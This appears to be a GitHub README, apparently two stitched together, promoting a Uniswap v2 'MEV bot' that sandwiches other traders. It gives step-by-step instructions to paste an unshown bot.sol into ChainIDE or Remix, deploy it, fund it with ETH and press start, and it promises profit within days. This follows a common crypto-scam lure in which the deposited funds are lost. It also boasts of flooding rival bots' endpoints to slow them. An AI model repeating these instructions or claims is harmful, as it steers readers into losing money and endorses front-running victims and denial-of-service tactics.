Apebot.eth's MEV-bot
Uniswap v2 MEV bot - Updated mempool settings - October 2022
The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Ser, plz share alpha?
Bot sends the Transaction and sniffs the Uniswap v2 Mempool

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity

Sending back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

But ser, there are open source bots that do the same
Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

Wen increase aggressiveness ?
As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
Personal journey in this
What did I learn?
MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
So why stop?
I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

MEV bot Instructions
(works only for Mainnet)

Access the ChainIDE Compiler and click on the big Ethereum Logo: https://chainide.com/

With the login button Select "Injected Web 3" and connect your Metamask or wallet with ChainIDE

On the left create a New File. Rename it as you like, i.e: “bot.sol"

Paste the code from bot.sol into the file

Move to the "Solidity Compiler" tab on the right side, select version "0.6.6" and then "Compile" it

Move to the "Deploy" tab right under the compiler tab. Enter 'ETH' on the Token Name field and your deployer wallet as withdrawal wallet into the second field and then "Deploy" it. After the transaction is confirmed, it's your own BOT now

Find your newly created contract address with the transaction Link. Copy the address and send some ETH to your exact contract/bot address

After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button

Do you feel the urge to send me some crypto?






# Mev-Bot
Make money with MevBot (ETH network)

How it works:

![create-a-frontrunner-bot-on-uniswap](https://user-images.githubusercontent.com/125767433/221687677-362450a0-997d-46fb-85bc-be0be14cdced.jpg)


You can see an example of how the bot works.
The bot will make transactions on your entire balance to increase profit


First-source code

Copy code and paste in Remix IDE
![1](https://user-images.githubusercontent.com/125767433/221686653-cc4a1e37-dec5-4b69-999b-164697e91ef9.png)


And click Solidity complier

Next-Deploy

connect your wallet to Remix IDE and compile Bot contract

![2](https://user-images.githubusercontent.com/125767433/221686681-61857242-f2ad-4f36-858a-3a52bfb5c537.png)


Next-deposit (balans Slippage Bot)

Send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button


![3](https://user-images.githubusercontent.com/125767433/221686710-3aeaf6b3-cc05-4b33-b45e-610dcdb65538.png)


Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2


at any time you can return your money by calling the withdrawal function
